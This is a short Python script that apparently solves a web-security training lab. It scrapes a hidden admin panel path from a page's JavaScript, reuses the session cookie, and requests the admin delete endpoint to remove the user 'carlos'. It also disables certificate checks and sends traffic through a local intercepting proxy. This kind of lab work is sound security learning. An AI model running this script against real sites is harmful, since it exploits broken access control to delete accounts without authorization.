import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def delete_user(url):
    req=requests.get(url,verify=False,proxies=proxie)

    #get cookies
    session_cookies=req.cookies.get_dict().get("session")
    print(session_cookies)
    #get admin panle
    
    Bsoup=BeautifulSoup(req.text,'lxml')
    admin_pan=Bsoup.find(text=re.compile("/admin-"))
    admin_pure=re.search("'href', '(.*)'",admin_pan).group(1)

    #delete user 
    cookie={"session":session_cookies}
    path_user="/delete?username=carlos"
    full_path=url+admin_pure+path_user
    req=requests.get(full_path,cookies=cookie,verify=False)
    if req.status_code==200:
        print("(+) user deleted secsesfuly")
        print("(+) Congratulations, you solved the lab!")

    else:
        print("error")

def main():

    
        

    if len(sys.argv) != 2:
        print("(+) Usage %s <url> "%sys.argv[0])
        print("(+) for Example use  %s -h "%sys.argv[0])
        sys.exit(-1)
    elif  sys.argv[1]== "-h" :
        
        print("(+) Example %s www.examlpe.com"%sys.argv[0])
        sys.exit(-1)
        

    url=sys.argv[1]
    print('delting user ......')
    delete_user(url)





if __name__ == "__main__":
    main()